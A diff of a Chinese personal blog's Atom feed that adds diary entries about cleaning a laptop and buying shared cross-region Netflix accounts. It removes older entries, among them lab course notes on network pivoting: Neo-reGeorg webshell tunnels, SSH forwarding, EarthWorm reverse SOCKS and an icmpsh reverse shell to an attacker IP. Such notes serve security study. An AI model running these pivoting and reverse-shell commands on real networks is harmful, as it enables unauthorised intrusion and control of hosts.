@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-07-26T16:46:09.930Z</updated>
+  <updated>2023-07-28T16:55:20.799Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,13 +17,59 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>一击</title>
+    <link href="http://example.com/2023/07/28/Diary_20230728/"/>
+    <id>http://example.com/2023/07/28/Diary_20230728/</id>
+    <published>2023-07-27T16:00:00.000Z</published>
+    <updated>2023-07-28T16:55:20.799Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/images/15.jpg" alt="秋"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>体验与猜测是两回事。</p><h1 id="笔记本"><a href="#笔记本" class="headerlink" title="笔记本"></a>笔记本</h1><p>今天拆开了自己的笔记本，为了清理灰尘和加装固态硬盘。</p><p>过程中其实没什么感觉，只想着要完成。结果都忘了拍照记录一下里面的样子了。<br>拆开后里面确实很多灰尘积聚，让人难以理解那么大一团是怎么堆在一起的。</p><p>打开后盖后，首先拔电源，太难拔了，不像别人视频里那么轻松，因为周围都是芯片，让我不能粗暴行事。<br>下一步则是拆散热器，拆这个的麻烦在于，不像后盖每个螺丝都按顺序排布，而是东一颗西一颗。整的我每次以为可以打开了又突然发现还有一颗。<br>拆开散热器之后便是清理了。散热器和风扇都非常脏，我直接把风扇用水冲洗再吹干了。散热器好像不能沾水所以我只能用刷子干刷，虽然没那么干净，至少把灰尘堵塞的地方给处理了。一切清理干净之后，将散热器归回原位之前，还需要涂硅脂。所幸赠送的小工具还算齐全，涂满了。<br>还有一个重头戏便是加装硬盘，塞进去即可，很轻松。<br>最后便是将后盖盖上，检验成效了。</p><p>刚开机的时候，一直显示不出Windows界面，我差点以为出事了，幸好等了一分钟后一切都回来了。<br>硬盘顺利显示出来，买的1T显示出来有930GB。本想通过这样扩容C盘，结果因为不是同一个区块，无法扩容。<br>之后又想着把以前的D盘空间分给C盘，结果也不行。原因是C盘与D盘并未相邻。<br>折腾了一通，还下了所谓口碑不错的某个分区助手。结果一点儿用没有。<br>最终我放弃了，选择清理C盘，增加了30GB之后就懒得折腾了。</p><p>用了一段时间，GPU温度42℃，还不错，比以前少了30℃左右。而且风扇也几乎不会转，没声音了。</p><p>总计花费2个半小时。还是挺久，第一次谨慎些也正常。虽然这次成功了，我也不想再清理。等哪时候散热感觉又不行了再说吧。</p><p>我去，本来在写日记的时候没问题，写着写着电脑蓝屏了，多半是我今天下午折腾导致的，突然想起来今天扭歪了散热器，好多地方还留下划痕，不知道是不是其中的某些原因。烦内，希望别再遇到了吧。</p><h1 id="王国"><a href="#王国" class="headerlink" title="王国"></a>王国</h1><p>今天看完了一部丧尸片的S1，王国。<br>这部是Netflix投资的韩国片，算是口碑最好的那几个了。一季有6集，每集50分钟左右。从总时长来说，和日漫差不多。<br>古代丧尸片，节奏稍微慢热。确实各方面都不错，制作上找不到挑剔的地方，情景也蛮逼真的（比如掉脑袋之类的）。看惯了日漫反而挺不习惯的。<br>犹豫要不要把S2看了…</p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/15.jpg&quot; alt=&quot;秋&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
+    
+    
+    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
+    
+    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>无事</title>
+    <link href="http://example.com/2023/07/27/Diary_20230727/"/>
+    <id>http://example.com/2023/07/27/Diary_20230727/</id>
+    <published>2023-07-26T16:00:00.000Z</published>
+    <updated>2023-07-28T08:08:55.594Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/images/14.jpg" alt="summer"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如此。</p><h1 id="Netflix"><a href="#Netflix" class="headerlink" title="Netflix"></a>Netflix</h1><p>今天在合租群买了一个便宜的Netflix，9元一月。</p><p>回顾起来自己一路上使用奈飞的过程。最初听说有这么一个全球最好的流媒体平台，想着试一试。<br>于是用PayPal付款，但由于网络状况，我多付了保证金，导致我那一次好像是花了400元左右才一个月。而这个是可以5人共用的，只有我一人用。想想还是挺亏的。为了不那么亏，后来随便找了个群问了问有没有人合租，找着一个，好像是让对方付了15给我。结果不知怎的，对方把付费方案给我取消了，我也就看不了了，问了他最后也说不出什么东西。</p><p>第二次，是在看到一个广告说卖合租奈飞，我看了下还挺便宜的，15元一月。再往后涨了一点，成了18元一月。我也接受了。<br>这次是我用的最久的一次，好长时间都在用。</p><p>第三次，也即这次。契机是我看了第二次合租的地区是巴基斯坦，最高级方案换算成人民币总共才27元。可5人用。也即每人平均6元。<br>本想之前的到期了自己开个巴基斯坦的，但是我担心找不着4个人，也是有些犹豫。<br>最后在合租群看有人开这个，我想了想也还能接受，于是加入了。</p><p>如果还有下一次的话，我想就是自己开Netflix了吧。</p><h1 id="成本"><a href="#成本" class="headerlink" title="成本"></a>成本</h1><p>回顾三次开Netflix逐步降低成本的过程，其实也蛮有趣的。<br>第一次通过正规途径，当冤大头。<br>第二次通过专业中间商，走一般的路。<br>第三次通过民间合租，走更便宜的路。</p><p>价格不同的根本原因在于低价区的存在和经手的中间商。</p><h1 id="低价区"><a href="#低价区" class="headerlink" title="低价区"></a>低价区</h1><p>跨区，以达到降低成本的目的。这也算支持正版吗？<br>steam，YouTube，Netflix等大平台很多都有低价区。低价区的目的主要就是由于经济差异，来让人们负担得起。<br>而跨区毫无疑问是违反了官方的政策，但最终也购买了官方的东西。我感觉其实还挺矛盾的。<br>假如一个游戏，本来应当付10元，最后只付了5元。算是正版行为还是盗版行为？<br>严格地说，这是不完全正确的行为，如果我们单论对错，无疑是错。<br>这个问题还是留到以后再说吧，今天不想了。</p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/14.jpg&quot; alt=&quot;summer&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
+    
+    
+    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
+    
+    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
+    
+  </entry>
+  
+  <entry>
     <title>虚无</title>
     <link href="http://example.com/2023/07/26/Diary_20230726/"/>
     <id>http://example.com/2023/07/26/Diary_20230726/</id>
     <published>2023-07-25T16:00:00.000Z</published>
-    <updated>2023-07-26T16:46:09.930Z</updated>
+    <updated>2023-07-28T07:30:25.346Z</updated>
     
-    <content type="html"><![CDATA[<p><img src="/images/Sky1.png" alt="天空之城"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有无。</p><h1 id="电子礼炮"><a href="#电子礼炮" class="headerlink" title="电子礼炮"></a>电子礼炮</h1><p>某亲戚买了电子礼炮，让我过去帮忙搬一下。一大早便是倾盆大雨像是破口大骂的泼妇，随后转而喋喋不休。让我内心有些抗拒。<br>无奈约好，于是去了。<br>搬的电子礼炮挺重，听说有1000多斤，即使下面有滚轮也让几个人挺吃力。再加上雨天搬车上更是麻烦了。<br>弄好后随后开车到一个偏僻之地测试，像个导弹发射器一样，还真有那么回事儿。<br>过程中一点小毛病很快解决了，于是轰隆声不断，顺利测试完，又回去了。<br>就这样，也没什么。</p><h1 id="电视"><a href="#电视" class="headerlink" title="电视"></a>电视</h1><p>因为今天大半天都是在亲戚家，看电视没人用，就投屏了《千与千寻》，主要有些不太熟的人不好意思直接放些没看过的电影以免出现某些奇怪的情节，而且也不太好放那种更偏向个人兴趣的片，人多就会混乱，那必然不能全心投入观赏之中。所以不如放一部看过的算是合家欢的电影。这部电影有50GB大小，正好也拿来测试清晰度了。<br>大概是由于影片太大，每次回退10s都会卡顿。也算是emby的一个缺点了吧。亲戚家的一位小孩子对千与千寻倒是看得津津有味。</p><h1 id="动画片"><a href="#动画片" class="headerlink" title="动画片"></a>动画片</h1><p>下午回到亲戚家后，那位小孩正在看某国产动画片。<br>我才认识到，原来国产动画片能烂到那种程度。与上午播放的千与千寻相比，一个天上一个地下。<br>怎么个烂法儿呢？搞些恶心的正能量，网络用词和各种烂梗之类的都在用，说话一惊一乍的，剧情稀烂…太多了。<br>还好我生得早了点，不然天天看这些东西，人都会变傻子的。</p><h1 id="虚无"><a href="#虚无" class="headerlink" title="虚无"></a>虚无</h1><p>我得承认，我又开始陷入虚无状态了。今天坐亲戚的车，几个人在聊天，但他们没说几句话，我内心的想法都是负面或虚无的。感觉只要一说出这些想法，能立马把这一小片空间的氛围给破坏掉。所以我全程一句话没说。</p>]]></content>
+    <content type="html"><![CDATA[<p><img src="/images/Sky1.png" alt="天空之城"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有无。</p><h1 id="电子礼炮"><a href="#电子礼炮" class="headerlink" title="电子礼炮"></a>电子礼炮</h1><p>某亲戚买了电子礼炮，让我过去帮忙搬一下。一大早便是倾盆大雨像是破口大骂的泼妇，随后转而喋喋不休。让我内心有些抗拒。<br>无奈约好，于是去了。<br>搬的电子礼炮挺重，听说有1000多斤，即使下面有滚轮也让几个人挺吃力。再加上雨天搬车上更是麻烦了。<br>弄好后随后开车到一个偏僻之地测试，像个导弹发射器一样，还真有那么回事儿。<br>过程中一点小毛病很快解决了，于是轰隆声不断，顺利测试完，又回去了。<br>就这样，也没什么。</p><h1 id="电视"><a href="#电视" class="headerlink" title="电视"></a>电视</h1><p>因为今天大半天都是在亲戚家，看电视没人用，就投屏了《千与千寻》，主要有些不太熟的人不好意思直接放些没看过的电影以免出现某些奇怪的情节，而且也不太好放那种更偏向个人兴趣的片，人多就会混乱，那必然不能全心投入观赏之中。所以不如放一部看过的算是合家欢的电影。这部电影有50GB大小，正好也拿来测试清晰度了。<br>大概是由于影片太大，每次回退10s都会卡顿。也算是emby的一个缺点了吧。亲戚家的一位小孩子对千与千寻倒是看得津津有味。</p><h1 id="动画片"><a href="#动画片" class="headerlink" title="动画片"></a>动画片</h1><p>下午回到亲戚家后，那位小孩正在看某国产动画片。<br>我才认识到，原来国产动画片能烂到那种程度。与上午播放的千与千寻相比，一个天上一个地下。<br>怎么个烂法儿呢？搞些恶心的正能量，网络用词和各种烂梗之类的都在用，说话一惊一乍的，剧情稀烂…太多了。<br>还好我生得早了点，不然天天看这些东西，人都会变傻子的。</p><h1 id="虚无"><a href="#虚无" class="headerlink" title="虚无"></a>虚无</h1><p>我得承认，我又开始陷入虚无状态了。今天坐亲戚的车，几个人在聊天，但他们说每几句话，我内心的想法都是负面或虚无的。感觉只要一说出这些想法，能立马把这一小片空间的氛围给破坏掉。所以我全程一句话没说。</p>]]></content>
     
     
     <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Sky1.png&quot; alt=&quot;天空之城&quot;&gt;&lt;/p&gt;</summary>
@@ -409,50 +455,6 @@
     <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
     
     <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>内网穿透之隧道通信</title>
-    <link href="http://example.com/2023/03/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
-    <id>http://example.com/2023/03/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/</id>
-    <published>2023-03-23T16:00:00.000Z</published>
-    <updated>2023-03-25T02:46:26.656Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>蜗牛学院的内网穿透之隧道通信课程笔记。</p><span id="more"></span><h1 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h1><p>通过Neo-reGeorg隧道通信的原理：(攻击机：kali，跳板机：Windows2016，靶机：win7)</p><ol><li>在kali上下载配置好Neo-reGeorg</li><li>进入Neo-reGeorg目录下，运行命令： <code>python3 neoreg.py generate -k &lt;password&gt;</code></li><li>此时成功生成了各种后缀的tunnel文件，选择合适的（这里以tunnel.php为例）</li><li>继续在当前目录下，执行命令： <code>python3 neoreg.py -k &lt;password&gt; -u http://&lt;跳板机IP&gt;/tunnel.php</code></li><li>在攻击机（kali）上配置代理：<br><code>SOCKS5 Host</code><br><code>127.0.0.1:1080</code></li><li>接下来访问，便可查看靶机（win7）的服务。</li></ol><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p>通过SSH隧道通信的原理：（攻击机：kali，跳板机：Centos7,靶机：win7）</p><h2 id="SSH本地转发"><a href="#SSH本地转发" class="headerlink" title="SSH本地转发"></a>SSH本地转发</h2><ol><li>kali上执行命令： <code>ssh -CfNg -L &lt;攻击机port&gt; &lt;靶机IP:port&gt; root@&lt;跳板机ip&gt;</code></li><li>成功运行命令后，输入跳板机的root密码，即可本地访问 <code>localhost:8879</code> ，实现对靶机IP:port的访问。</li><li>即可成功访问</li></ol><h2 id="SSH远程转发"><a href="#SSH远程转发" class="headerlink" title="SSH远程转发"></a>SSH远程转发</h2><ol><li>跳板机上运行以下指令：<br><code>ssh -CfNg -R &lt;攻击机的port&gt;:&lt;靶机IP:port&gt; root@&lt;攻击机IP&gt;</code></li></ol><h1 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h1><p>通过EarthWorm工具通信（攻击机：kali，跳板机：Windows2016，靶机：win7）</p><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><ol><li><p>在跳板机上使用命令： <code>ew_for_win_32.exe -s ssocksd -l 1080</code></p></li><li><p>在kali中配置代理：<br>SOCKS5<br>跳板机IP:port</p></li><li><p>成功访问</p></li></ol><h2 id="反弹代理"><a href="#反弹代理" class="headerlink" title="反弹代理"></a>反弹代理</h2><ol><li>先找一台公网服务器，运行命令：<br><code>./ew_for_linux64 -s rcsocks -l 8080 -e 8086</code></li><li>在跳板机上运行命令：<br><code>ew_for_win_32.exe -s rssocks -d &lt;公网IP&gt; -e 8086</code></li><li>在kali上配置代理服务器为：<br>SOCKS5<br><code>&lt;公网IP:8080&gt;</code></li></ol><h1 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h1><p>icmp隧道搭建的场景主要用于在拦截策略关闭了端口，而ICMP协议用于检测网络连通状态，不依赖于端口开放，而防火墙通常会开放此协议。常见的ICMP工具有：icmpsh, pingtunnel, icmptunnel, powershell icmp</p><h2 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h2><p>通过icmpsh工具通信（攻击机：kali，跳板机：Windows2016，靶机：win7）<br><a href="https://github.com/bdamele/icmpsh">下载地址</a></p><ol><li><p>在跳板机上运行icmpsh.exe<br><code>icmpsh.exe -t &lt;攻击机IP&gt;</code></p></li><li><p>关闭本地系统的ICMP响应<br><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1      # 设置0可以还原</code></p></li><li><p>在攻击机上运行命令：<br><code>./icmpsh_m.py &lt;攻击机IP&gt; &lt;跳板机IP&gt;</code></p></li><li><p>再次运行icmpsh.exe<br>重复执行1的步骤</p></li><li><p>成功反弹，攻击机控制跳板机<br>可打开Wireshark检测流量（ICMP不够隐蔽）</p></li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;蜗牛学院的内网穿透之隧道通信课程笔记。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="内网穿透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
-    
-    <category term="隧道通信" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
-    
-    
-    <category term="隧道通信" scheme="http://example.com/tags/%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>世界的参差</title>
-    <link href="http://example.com/2023/03/23/%E4%B8%96%E7%95%8C%E7%9A%84%E5%8F%82%E5%B7%AE/"/>
-    <id>http://example.com/2023/03/23/%E4%B8%96%E7%95%8C%E7%9A%84%E5%8F%82%E5%B7%AE/</id>
-    <published>2023-03-22T16:00:00.000Z</published>
-    <updated>2023-03-27T13:31:56.768Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="/images/ocean.png" alt="world"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>乱花渐欲迷人眼，表象无言惑人心。</p><h1 id="信息差"><a href="#信息差" class="headerlink" title="信息差"></a>信息差</h1><p>最近用搜索引擎找电子书找不到想要的，通过其它方式一下子就找到了。在官方平台上点麦当劳却比某平台上贵十余元。想说说关于信息差的事。</p><p>信息差的例子随处可见，其中著名的一个例子是罗斯柴尔德利用滑铁卢战役的信息差谋取暴利的故事。信息差也被广泛利用，有人靠信息差就能养活自己，有人靠信息差混淆视听。身处互联网时代，网上的信息过于庞杂和碎片化，很难辨别真假和质量。同时，互联网也会根据用户的喜好和习惯，推送相似或者相符的信息，导致用户陷入信息茧房，无法接触到更多元和更广的信息。因此，互联网并没有让人们更加平等和智慧，而是让人们更加孤立和愚昧。</p><p>世界的参差不是第18层地狱与第1层地狱的区别，是地狱与天堂的区别。</p><h1 id="信息的高低"><a href="#信息的高低" class="headerlink" title="信息的高低"></a>信息的高低</h1><p>信息有高低之分，信息的质量会影响我们的认知和决策。如何获取更好的信息，我有几点想法：</p><ol><li>找到源头或接近源头的消息。确保消息传递过程中不会被加工或是扭曲。</li><li>广泛获取信息来源，多方得到信息渠道，留下值得信赖的信息源。</li><li>对于私人公布的信息，很多时候无从考据，但一般更有价值。需要谨慎分辨。</li><li>很多消息本身并不重要，重要的是背后的目的和趋势。</li><li>通常意义上，知道这个信息的人越少，这个信息的在某方面的价值越高。</li></ol><h1 id="表象"><a href="#表象" class="headerlink" title="表象"></a>表象</h1><p>很显然，表象泛滥于世界。无法否认的是，大部分人都沉浸于表象之中，这注定了能够看到背后本质的人会很少。表象如同世界的岩浆幻想，人们只是见到其通红便想象它的炽热，只是见到它的通红便不愿深究其内在。</p><h1 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h1><p>本质是世界运行的规则，知其然更知其所以然，我们只需要知道世界运行的本质，就能从一个个表象中脱离，省去大量无意义的重复活动，提高效率，在更短时间内做更多事。</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/ocean.png&quot; alt=&quot;world&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
-    
-    
-    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
     
   </entry>
   
